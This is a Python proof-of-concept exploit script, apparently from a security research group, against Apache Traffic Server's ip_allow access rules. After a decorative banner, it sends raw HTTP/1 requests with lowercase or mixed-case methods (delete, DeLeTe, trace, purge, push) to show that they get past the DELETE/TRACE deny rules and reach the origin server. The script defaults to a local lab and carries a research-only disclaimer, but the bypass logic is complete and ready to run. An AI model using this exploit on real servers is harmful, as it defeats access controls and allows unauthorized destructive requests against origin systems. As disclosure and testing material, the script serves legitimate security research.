#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: ats-ipallow-method-case (High: 7.5)
#  Vendor: Apache Traffic Server (ASF)
#  Versions: Apache Traffic Server 10.2.0 (b1df7334)
#  Impact: Mixed-case HTTP/1 DELETE/TRACE skip ip_allow deny and tunnel to origin
#  Requires: HTTP/1 from a non-loopback client; remap_required 1 plus one map
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "ats-ipallow-method-case"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""HTTP/1 mixed-case methods skip default ip_allow.yaml deny and tunnel to origin."""


import json
import os
import socket
import time
from dataclasses import dataclass

LABEL = os.environ.get("LAB_LABEL", "ats-ipallow-method-case")
WITNESS = os.environ.get("LAB_WITNESS", "ATS-IPALLOW-METHOD-CASE-WITNESS")
ATS_HOST = os.environ.get("ATS_HOST", "ats")
ATS_PORT = int(os.environ.get("ATS_PORT", "8080"))
HOST_HEADER = os.environ.get("ATS_HOST_HEADER", "ats.example")
TIMEOUT_SEC = float(os.environ.get("LAB_TIMEOUT", "12"))
READY_ATTEMPTS = int(os.environ.get("LAB_READY_ATTEMPTS", "40"))


@dataclass(frozen=True)
class HttpResponse:
    status: int
    headers: str
    body: str
    raw: str


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def _unchunk(body: str) -> str:
    pieces: list[str] = []
    rest = body
    while rest:
        line, _, rest = rest.partition("\r\n")
        try:
            size = int(line.split(";", 1)[0].strip(), 16)
        except ValueError:
            return body
        if size == 0:
            break
        pieces.append(rest[:size])
        rest = rest[size:]
        if rest.startswith("\r\n"):
            rest = rest[2:]
    return "".join(pieces)


def parse_http(raw: bytes) -> HttpResponse:
    text = raw.decode("utf-8", "replace")
    if "\r\n\r\n" not in text:
        header_blob, body = text, ""
    else:
        header_blob, body = text.split("\r\n\r\n", 1)
    status = 0
    first = header_blob.split("\r\n", 1)[0]
    parts = first.split(" ", 2)
    if len(parts) >= 2 and parts[1].isdigit():
        status = int(parts[1])
    if "transfer-encoding: chunked" in header_blob.lower():
        body = _unchunk(body)
    return HttpResponse(status=status, headers=header_blob, body=body, raw=text)


def raw_request(method: str, path: str = "/", extra_headers: str = "") -> HttpResponse:
    # urllib/requests canonicalize the method; the leftover is HTTP/1 request-line case.
    request = (
        f"{method} {path} HTTP/1.1\r\n"
        f"Host: {HOST_HEADER}\r\n"
        "Connection: close\r\n"
        f"{extra_headers}"
        "\r\n"
    )
    with socket.create_connection((ATS_HOST, ATS_PORT), timeout=TIMEOUT_SEC) as sock:
        sock.settimeout(TIMEOUT_SEC)
        sock.sendall(request.encode("ascii"))
        chunks: list[bytes] = []
        while True:
            try:
                data = sock.recv(16384)
            except TimeoutError:
                break
            if not data:
                break
            chunks.append(data)
    return parse_http(b"".join(chunks))


def origin_hits() -> list[dict[str, str]]:
    resp = raw_request("GET", "/hits")
    if resp.status != 200:
        log(f"IOC hits-status={resp.status} body={resp.body[:180]!r}")
        return []
    try:
        payload = json.loads(resp.body)
    except json.JSONDecodeError:
        log(f"IOC hits-json-fail body={resp.body[:180]!r}")
        return []
    hits = payload.get("hits")
    if not isinstance(hits, list):
        return []
    out: list[dict[str, str]] = []
    for item in hits:
        if isinstance(item, dict):
            out.append({str(k): str(v) for k, v in item.items()})
    return out


def originals_since(before: list[dict[str, str]], after: list[dict[str, str]]) -> list[str]:
    prior = len(before)
    return [item.get("original", "") for item in after[prior:]]


def wait_ready() -> HttpResponse | None:
    last: HttpResponse | None = None
    for attempt in range(1, READY_ATTEMPTS + 1):
        try:
            last = raw_request("GET", "/")
        except OSError as exc:
            log(f"IOC wait-ready attempt={attempt} err={exc}")
            time.sleep(2)
            continue
        log(f"IOC wait-ready attempt={attempt} status={last.status} body={last.body[:40]!r}")
        if last.status == 200 and "GET-OK" in last.body:
            return last
        time.sleep(2)
    return last


def main() -> int:
    log(f"IOC start host={ATS_HOST}:{ATS_PORT} hdr={HOST_HEADER}")
    ready = wait_ready()
    if ready is None or ready.status != 200 or "GET-OK" not in ready.body:
        return fail("ats-not-ready")

    before_control = origin_hits()
    control = raw_request("DELETE", "/")
    log(
        "IOC control-DELETE status={s} witness={w} body={b!r}".format(
            s=control.status,
            w="yes" if WITNESS in control.body else "no",
            b=control.body[:160],
        )
    )
    if control.status != 403:
        return fail(f"control-delete-not-denied status={control.status}")
    if WITNESS in control.body:
        return fail("control-delete-hit-origin")
    after_control = origin_hits()
    control_orig = originals_since(before_control, after_control)
    if "DELETE" in control_orig:
        return fail("control-delete-origin-hit")
    log(f"IOC control-origin-new={control_orig or '-'}")

    before_poc = origin_hits()
    poc = raw_request("delete", "/")
    log(
        "IOC poc-delete status={s} witness={w} body={b!r}".format(
            s=poc.status,
            w="yes" if WITNESS in poc.body else "no",
            b=poc.body[:160],
        )
    )
    if poc.status != 200:
        return fail(f"poc-delete-status status={poc.status}")
    if WITNESS not in poc.body:
        return fail("poc-delete-no-witness")
    after_poc = origin_hits()
    poc_orig = originals_since(before_poc, after_poc)
    if "delete" not in poc_orig:
        return fail(f"poc-delete-origin-miss orig={poc_orig}")
    log(f"IOC poc-origin-new={poc_orig}")

    mixed = raw_request("DeLeTe", "/")
    log(
        "IOC poc-DeLeTe status={s} witness={w}".format(
            s=mixed.status,
            w="yes" if WITNESS in mixed.body else "no",
        )
    )
    if mixed.status != 200 or WITNESS not in mixed.body:
        return fail(f"poc-mixed-delete status={mixed.status}")

    trace_deny = raw_request("TRACE", "/")
    log(f"IOC control-TRACE status={trace_deny.status}")
    if trace_deny.status != 403:
        return fail(f"control-trace-not-denied status={trace_deny.status}")
    if WITNESS in trace_deny.body:
        return fail("control-trace-hit-origin")

    trace_fwd = raw_request("trace", "/")
    log(
        "IOC poc-trace status={s} witness={w} body={b!r}".format(
            s=trace_fwd.status,
            w="yes" if WITNESS in trace_fwd.body else "no",
            b=trace_fwd.body[:120],
        )
    )
    if trace_fwd.status != 200 or "TRACE-OK" not in trace_fwd.body:
        return fail(f"poc-trace-not-forwarded status={trace_fwd.status}")

    purge = raw_request("purge", "/")
    log(f"IOC poc-purge status={purge.status} body={purge.body[:80]!r}")
    if purge.status != 200 or "PURGE-ORIGIN" not in purge.body:
        return fail(f"poc-purge-not-tunneled status={purge.status}")

    push = raw_request("push", "/")
    log(f"IOC poc-push status={push.status} body={push.body[:80]!r}")
    if push.status != 200 or "PUSH-ORIGIN" not in push.body:
        return fail(f"poc-push-not-tunneled status={push.status}")

    log(
        "SUCCESS {label} how=live control=DELETE/TRACE-403 "
        "poc=delete/DeLeTe/trace-tunneled cache-purge-push=closed "
        "{witness}".format(label=LABEL, witness=WITNESS)
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

